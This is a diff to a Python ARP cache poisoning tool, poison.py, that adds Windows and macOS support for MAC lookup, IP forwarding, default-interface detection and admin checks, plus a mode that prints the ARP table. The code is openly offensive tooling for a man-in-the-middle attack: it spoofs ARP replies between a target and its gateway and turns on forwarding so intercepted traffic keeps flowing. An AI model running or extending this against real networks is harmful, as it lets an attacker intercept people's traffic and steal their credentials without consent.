@@ -3,6 +3,7 @@
 
 import argparse
 import os
+import platform
 import signal
 import socket
 import subprocess
@@ -10,20 +11,24 @@ import struct
 import sys
 import time
 
+PLATFORM = platform.system().lower()
+
 
 def get_mac(ip, iface=None, timeout=2):
     """get mac address for an ip using arp"""
     try:
-        result = subprocess.run(
-            ["arp", "-n", ip],
-            capture_output=True, text=True, timeout=5
-        )
+        if PLATFORM == "windows":
+            cmd = ["arp", "-a", ip]
+        else:
+            cmd = ["arp", "-n", ip]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
         for line in result.stdout.split("\n"):
             if ip in line:
                 parts = line.split()
                 for part in parts:
-                    if ":" in part and len(part) == 17:
-                        return part
+                    clean = part.replace("-", ":")
+                    if ":" in clean and len(clean) == 17:
+                        return clean
     except (subprocess.TimeoutExpired, OSError):
         pass
     return None
@@ -31,11 +36,39 @@ def get_mac(ip, iface=None, timeout=2):
 
 def get_own_mac(iface="eth0"):
     """get our own mac address"""
-    try:
-        with open(f"/sys/class/net/{iface}/address", "r") as f:
-            return f.read().strip()
-    except FileNotFoundError:
-        return None
+    if PLATFORM == "linux":
+        try:
+            with open(f"/sys/class/net/{iface}/address", "r") as f:
+                return f.read().strip()
+        except (FileNotFoundError, PermissionError):
+            pass
+    elif PLATFORM == "darwin":
+        try:
+            result = subprocess.run(
+                ["ifconfig", iface],
+                capture_output=True, text=True, timeout=5
+            )
+            for line in result.stdout.split("\n"):
+                if "ether" in line:
+                    return line.split("ether")[1].strip().split()[0]
+        except (subprocess.TimeoutExpired, OSError):
+            pass
+    elif PLATFORM == "windows":
+        try:
+            result = subprocess.run(
+                ["getmac", "/v", "/fo", "csv"],
+                capture_output=True, text=True, timeout=5
+            )
+            for line in result.stdout.split("\n"):
+                if iface.lower() in line.lower() or "connected" in line.lower():
+                    parts = line.split(",")
+                    for part in parts:
+                        clean = part.strip('"').replace("-", ":")
+                        if len(clean) == 17 and ":" in clean:
+                            return clean.lower()
+        except (subprocess.TimeoutExpired, OSError):
+            pass
+    return None
 
 
 def build_arp_packet(src_mac, src_ip, dst_mac, dst_ip, op=2):
@@ -65,28 +98,55 @@ def build_arp_packet(src_mac, src_ip, dst_mac, dst_ip, op=2):
 
 def enable_forwarding():
     """enable ip forwarding to maintain connectivity"""
-    try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("1")
-        return True
-    except PermissionError:
-        subprocess.run(
-            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
+    if PLATFORM == "linux":
+        try:
+            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                f.write("1")
+            return True
+        except PermissionError:
+            subprocess.run(
+                ["sysctl", "-w", "net.ipv4.ip_forward=1"],
+                capture_output=True
+            )
+            return True
+        except OSError:
+            return False
+    elif PLATFORM == "darwin":
+        result = subprocess.run(
+            ["sysctl", "-w", "net.inet.ip.forwarding=1"],
             capture_output=True
         )
-        return True
-    except OSError:
-        return False
+        return result.returncode == 0
+    elif PLATFORM == "windows":
+        result = subprocess.run(
+            ["netsh", "interface", "ipv4", "set", "interface",
+             "forwarding=enabled"],
+            capture_output=True
+        )
+        return result.returncode == 0
+    return False
 
 
 def disable_forwarding():
     """disable ip forwarding on cleanup"""
-    try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("0")
-    except (PermissionError, OSError):
+    if PLATFORM == "linux":
+        try:
+            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                f.write("0")
+        except (PermissionError, OSError):
+            subprocess.run(
+                ["sysctl", "-w", "net.ipv4.ip_forward=0"],
+                capture_output=True
+            )
+    elif PLATFORM == "darwin":
         subprocess.run(
-            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
+            ["sysctl", "-w", "net.inet.ip.forwarding=0"],
+            capture_output=True
+        )
+    elif PLATFORM == "windows":
+        subprocess.run(
+            ["netsh", "interface", "ipv4", "set", "interface",
+             "forwarding=disabled"],
             capture_output=True
         )
 
@@ -182,22 +242,94 @@ def poison(target_ip, gateway_ip, iface="eth0", interval=2):
     print(f"\ntotal: {count * 2} packets in {elapsed:.1f}s")
 
 
+def _default_interface():
+    """detect default network interface for the platform"""
+    if PLATFORM == "linux":
+        try:
+            result = subprocess.run(
+                ["ip", "route", "show", "default"],
+                capture_output=True, text=True, timeout=5
+            )
+            parts = result.stdout.split()
+            if "dev" in parts:
+                return parts[parts.index("dev") + 1]
+        except (subprocess.TimeoutExpired, OSError):
+            pass
+        return "eth0"
+    elif PLATFORM == "darwin":
+        try:
+            result = subprocess.run(
+                ["route", "-n", "get", "default"],
+                capture_output=True, text=True, timeout=5
+            )
+            for line in result.stdout.split("\n"):
+                if "interface:" in line:
+                    return line.split("interface:")[1].strip()
+        except (subprocess.TimeoutExpired, OSError):
+            pass
+        return "en0"
+    return "eth0"
+
+
+def show_arp_table():
+    """display current arp table as default action"""
+    print("arp cache poisoning tool")
+    print("usage: poison.py <target_ip> <gateway_ip> [-i interface]")
+    print("\ncurrent arp table:\n")
+    try:
+        if PLATFORM == "windows":
+            cmd = ["arp", "-a"]
+        elif PLATFORM == "darwin":
+            cmd = ["arp", "-a"]
+        else:
+            cmd = ["arp", "-n"]
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
+        print(result.stdout.strip() or "  (empty)")
+    except (subprocess.TimeoutExpired, OSError):
+        print("  could not read arp table")
+    print("\nnote: actual poisoning requires explicit target and gateway args")
+
+
+def _check_root():
+    """check for root/admin privileges across platforms"""
+    if PLATFORM == "windows":
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except (ImportError, AttributeError):
+            return False
+    return os.geteuid() == 0
+
+
 def main():
     parser = argparse.ArgumentParser(description="arp cache poisoning")
-    parser.add_argument("target", help="target ip")
-    parser.add_argument("gateway", help="gateway ip")
-    parser.add_argument("-i", "--interface", default="eth0",
-                        help="network interface (default: eth0)")
+    parser.add_argument("target", nargs="?", default=None, help="target ip")
+    parser.add_argument("gateway", nargs="?", default=None, help="gateway ip")
+    parser.add_argument("-i", "--interface", default=None,
+                        help="network interface")
     parser.add_argument("--interval", type=float, default=2,
                         help="poison interval in seconds (default: 2)")
 
     args = parser.parse_args()
 
-    if os.geteuid() != 0:
-        print("must run as root", file=sys.stderr)
+    if not args.target or not args.gateway:
+        show_arp_table()
+        return
+
+    if not _check_root():
+        print("must run as root/admin", file=sys.stderr)
         sys.exit(1)
 
-    poison(args.target, args.gateway, args.interface, args.interval)
+    iface = args.interface or _default_interface()
+
+    if PLATFORM != "linux":
+        print(f"warning: raw arp spoofing requires AF_PACKET (linux only)",
+              file=sys.stderr)
+        print("on other platforms, consider using a tool like ettercap",
+              file=sys.stderr)
+        sys.exit(1)
+
+    poison(args.target, args.gateway, iface, args.interval)
 
 
 if __name__ == "__main__":
